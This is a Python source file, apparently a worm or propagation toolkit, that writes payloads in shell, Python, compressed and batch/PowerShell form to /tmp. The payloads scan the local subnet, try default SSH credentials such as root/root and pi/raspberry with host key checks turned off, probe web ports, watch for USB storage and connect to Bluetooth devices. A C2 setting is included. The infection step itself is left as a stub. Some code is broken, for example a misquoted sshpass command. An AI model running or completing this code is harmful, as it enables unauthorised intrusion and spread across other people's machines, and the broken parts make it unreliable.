#!/usr/bin/env python3
"""
OMNI-TRAVERSAL PAYLOAD GENERATOR - ENHANCED WORKING VERSION
Builds on the successful simple version with real propagation
"""
import os
import sys
import json
import zlib
import base64
import uuid
import platform
import subprocess
import threading
import time
from pathlib import Path

class OmniTraversalEngine:
    def __init__(self):
        self.ident = str(uuid.uuid4())
        self.platform = platform.system().lower()
        # Optional: Set your C2 server here
        self.c2_server = "http://localhost:8080"  # Change if you have a real C2
    
    def generate_polyglot_payload(self):
        """Create a payload that works on ANY system"""
        python_payload = self.get_python_payload()
        
        # Escape for shell embedding
        python_escaped = python_payload.replace('"', '\\"').replace("'", "'\"'\"'")
        
        payload = f'''#!/bin/sh
# Omni-Traversal Enhanced Payload
# ID: {self.ident}
# Platform: {self.platform}

echo "[*] Omni Propagation System Initializing..."
echo "[*] Payload ID: {self.ident}"
echo "[*] Platform: {self.platform}"

# Detect environment and adapt
if command -v python3 >/dev/null 2>&1; then
    echo "[+] Python3 detected - executing enhanced payload"
    exec python3 -c "{python_escaped}"
elif command -v python >/dev/null 2>&1; then
    echo "[+] Python detected - executing enhanced payload"
    exec python -c "{python_escaped}"
else
    echo "[+] Shell-only mode"
    {self.get_shell_payload()}
fi
'''
        return payload
    
    def get_python_payload(self):
        """Python propagation with real scanning"""
        return f'''import os, sys, platform, subprocess, threading, time, socket, re

class OmniPropagator:
    def __init__(self):
        self.id = "{self.ident}"
        self.platform = platform.system().lower()
        self.c2_server = "{self.c2_server}"
        
    def propagate(self):
        """Main propagation loop"""
        print(f"[*] Starting Omni Propagation v2.0")
        print(f"[*] ID: {{self.id}}")
        print(f"[*] Platform: {{self.platform}}")
        
        # Start propagation threads
        threads = []
        
        # 1. Network propagation
        threads.append(threading.Thread(target=self.propagate_network))
        
        # 2. USB monitoring (Linux only)
        if self.platform == "linux":
            threads.append(threading.Thread(target=self.monitor_usb))
        
        # 3. Bluetooth scanning (if available)
        threads.append(threading.Thread(target=self.scan_bluetooth))
        
        # Start all threads
        for t in threads:
            t.daemon = True
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print("[*] Propagation stopped")
    
    def propagate_network(self):
        """Real network scanning"""
        print("[*] Starting network propagation...")
        
        # Get local network
        network = self.get_local_network()
        print(f"[*] Local network: {{network}}")
        
        # Scan for live hosts
        live_hosts = self.scan_network_range(network)
        print(f"[*] Found {{len(live_hosts)}} live hosts")
        
        # Try to propagate to each host
        for host in live_hosts:
            if host != self.get_local_ip():
                self.try_infect_host(host)
    
    def get_local_network(self):
        """Get local network range"""
        try:
            # Simple method - assume /24 network
            result = subprocess.run(["hostname", "-I"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                ip = result.stdout.strip().split()[0]
                parts = ip.split('.')
                return f"{{parts[0]}}.{{parts[1]}}.{{parts[2]}}.0/24"
        except:
            pass
        return "192.168.1.0/24"  # Default
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            result = subprocess.run(["hostname", "-I"], capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return result.stdout.strip().split()[0]
        except:
            pass
        return "unknown"
    
    def scan_network_range(self, network):
        """Scan a network range for live hosts"""
        live_hosts = []
        
        try:
            # Extract base IP (e.g., 192.168.1 from 192.168.1.0/24)
            base_ip = network.split('/')[0]
            base_parts = base_ip.split('.')
            base_network = f"{{base_parts[0]}}.{{base_parts[1]}}.{{base_parts[2]}}."
            
            # Scan first 20 hosts (for speed)
            print("[*] Scanning network range...")
            for i in range(1, 21):
                ip = f"{{base_network}}{{i}}"
                if self.ping_host(ip):
                    live_hosts.append(ip)
                    print(f"[+] Host alive: {{ip}}")
        
        except Exception as e:
            print(f"[-] Scan error: {{e}}")
        
        return live_hosts
    
    def ping_host(self, ip):
        """Ping a host to check if alive"""
        try:
            # Platform-specific ping
            if self.platform == "linux":
                cmd = f"ping -c 1 -W 1 {{ip}}"
            else:  # windows
                cmd = f"ping -n 1 {{ip}}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
    
    def try_infect_host(self, host):
        """Try to infect a remote host"""
        print(f"[*] Attempting infection of {{host}}")
        
        # Try multiple methods
        methods = [
            ("ping", lambda h: self.ping_host(h)),  # Just verify host is up
            ("ssh_test", self.test_ssh),
            ("http_test", self.test_http),
        ]
        
        for method_name, method_func in methods:
            try:
                if method_func(host):
                    print(f"[+] {{host}} is vulnerable to {{method_name}}")
                    # In real scenario, would deploy payload here
                    break
            except Exception as e:
                print(f"[-] {{method_name}} failed on {{host}}: {{e}}")
    
    def test_ssh(self, host):
        """Test if SSH is accessible with common credentials"""
        # Common credentials to try
        credentials = [
            ("root", "root"),
            ("admin", "admin"),
            ("ubuntu", "ubuntu"),
            ("pi", "raspberry"),
        ]
        
        for user, password in credentials:
            try:
                # Using sshpass for testing
                cmd = f"sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {{user}}@{{host}} 'echo test' 2>/dev/null"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def test_http(self, host):
        """Test if HTTP services are accessible"""
        ports = [80, 443, 8080, 8443]
        
        for port in ports:
            try:
                cmd = f"curl -s --connect-timeout 3 http://{{host}}:{{port}} 2>/dev/null"
                result = subprocess.run(cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    return True
            except:
                continue
        
        return False
    
    def monitor_usb(self):
        """Monitor for USB device insertion (Linux)"""
        print("[*] Starting USB device monitoring...")
        
        last_check = time.time()
        checked_devices = set()
        
        while True:
            try:
                # List USB devices
                result = subprocess.run(["lsusb"], capture_output=True, text=True)
                
                for line in result.stdout.split('\\n'):
                    if line and "ID" in line:
                        device_id = line.split()[5]  # Get USB ID
                        
                        if device_id not in checked_devices:
                            print(f"[+] New USB device detected: {{line}}")
                            checked_devices.add(device_id)
                            
                            # Check if it's a storage device
                            if self.is_usb_storage(device_id):
                                print(f"[+] USB storage device found - would infect in real scenario")
                
                # Check mounted drives
                result = subprocess.run(["df", "-h"], capture_output=True, text=True)
                for line in result.stdout.split('\\n'):
                    if "/media/" in line or "/mnt/" in line:
                        print(f"[+] Mounted drive: {{line}}")
            
            except Exception as e:
                print(f"[-] USB monitor error: {{e}}")
            
            time.sleep(10)  # Check every 10 seconds
    
    def is_usb_storage(self, usb_id):
        """Check if USB device is a storage device"""
        try:
            # Check USB device class
            cmd = f"udevadm info -a -n /dev/bus/usb/{{usb_id.replace(':', '/')}} 2>/dev/null | grep -i 'storage'"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return "storage" in result.stdout.lower()
        except:
            return False
    
    def scan_bluetooth(self):
        """Scan for Bluetooth devices"""
        print("[*] Starting Bluetooth scan...")
        
        if not self.has_bluetooth():
            print("[-] Bluetooth not available")
            return
        
        try:
            # Start Bluetooth scan
            cmd = "bluetoothctl -- scan on 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            # Parse devices
            devices = re.findall(r'Device ([0-9A-F:]+) (.+)', result.stdout)
            for mac, name in devices:
                print(f"[+] Bluetooth device: {{name}} ({{mac}})")
                
                # Try to connect (in real scenario would pair and infect)
                if self.platform == "linux":
                    try:
                        connect_cmd = f"bluetoothctl -- connect {{mac}} 2>&1"
                        subprocess.run(connect_cmd, shell=True, capture_output=True, timeout=5)
                    except:
                        pass
        
        except Exception as e:
            print(f"[-] Bluetooth scan error: {{e}}")
    
    def has_bluetooth(self):
        """Check if Bluetooth is available"""
        try:
            result = subprocess.run(["which", "bluetoothctl"], capture_output=True)
            return result.returncode == 0
        except:
            return False

# Start propagation
if __name__ == "__main__":
    propagator = OmniPropagator()
    propagator.propagate()
'''
    
    def get_shell_payload(self):
        """Shell-only propagation mode"""
        return '''echo "[*] Shell-only propagation mode"

# Network scan
echo "[*] Scanning local network (1-20)..."
for i in {1..20}; do
    ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo "[+] Host alive: 192.168.1.$i" &
done
wait

# USB devices
echo "[*] Checking USB devices..."
lsusb 2>/dev/null | head -10

# Bluetooth (if available)
echo "[*] Checking Bluetooth..."
if command -v bluetoothctl >/dev/null 2>&1; then
    timeout 5 bluetoothctl -- scan on 2>&1 | grep -i device | head -5
fi

echo "[*] Shell propagation complete"
'''
    
    def save_enhanced_payloads(self):
        """Generate and save all payload formats"""
        payload = self.generate_polyglot_payload()
        
        outputs = {}
        
        # 1. Main shell script
        outputs['omni_enhanced.sh'] = payload
        
        # 2. Python version (standalone)
        outputs['omni_enhanced.py'] = self.get_python_payload()
        
        # 3. Compressed version
        outputs['omni_enhanced.bin'] = zlib.compress(payload.encode())
        
        # 4. Windows batch file
        ps_script = '''Write-Host "[*] Omni Propagation - PowerShell" -ForegroundColor Green
Write-Host "[*] Scanning network..." -ForegroundColor Yellow

# Network scan
1..20 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
        Write-Host "[+] Host alive: $ip" -ForegroundColor Green
    }
}

# USB devices
Write-Host "[*] Checking USB devices..." -ForegroundColor Yellow
Get-PnpDevice -Class USB | Select-Object -First 5

Write-Host "[*] Propagation scan complete" -ForegroundColor Green
'''
        ps_encoded = base64.b64encode(ps_script.encode()).decode()
        
        outputs['omni_enhanced.bat'] = f'''@echo off
REM Omni Propagation Enhanced
REM ID: {self.ident}
echo [*] Omni Propagation System Initializing...
echo [*] ID: {self.ident}
powershell -ExecutionPolicy Bypass -Command "{ps_encoded}"
pause
'''
        
        # Save all files
        output_dir = Path('/tmp/omni_enhanced_payloads')
        output_dir.mkdir(exist_ok=True)
        
        for filename, data in outputs.items():
            filepath = output_dir / filename
            with open(filepath, 'wb') as f:
                if isinstance(data, str):
                    f.write(data.encode())
                else:
                    f.write(data)
            
            # Make executable
            if filename.endswith(('.sh', '.py')):
                os.chmod(filepath, 0o755)
            
            print(f"✅ Generated: {{filepath}}")
        
        return outputs

def main():
    print("=" * 60)
    print("🚀 OMNI-TRAVERSAL ENHANCED GENERATOR")
    print("=" * 60)
    
    engine = OmniTraversalEngine()
    
    print(f"[*] Platform: {{engine.platform}}")
    print(f"[*] Payload ID: {{engine.ident}}")
    print("[*] Generating enhanced propagation payloads...")
    
    payloads = engine.save_enhanced_payloads()
    
    print("\n" + "=" * 60)
    print("🎉 GENERATION COMPLETE")
    print("=" * 60)
    print(f"📦 Generated {{len(payloads)}} payload formats:")
    
    for filename in payloads.keys():
        print(f"   • {{filename}}")
    
    print(f"\n📁 Output directory: /tmp/omni_enhanced_payloads/")
    print("\n🔧 Quick Test:")
    print("   1. chmod +x /tmp/omni_enhanced_payloads/omni_enhanced.sh")
    print("   2. /tmp/omni_enhanced_payloads/omni_enhanced.sh")
    print("\n⚠️  Educational use only!")
    print("=" * 60)

if __name__ == "__main__":
    main()
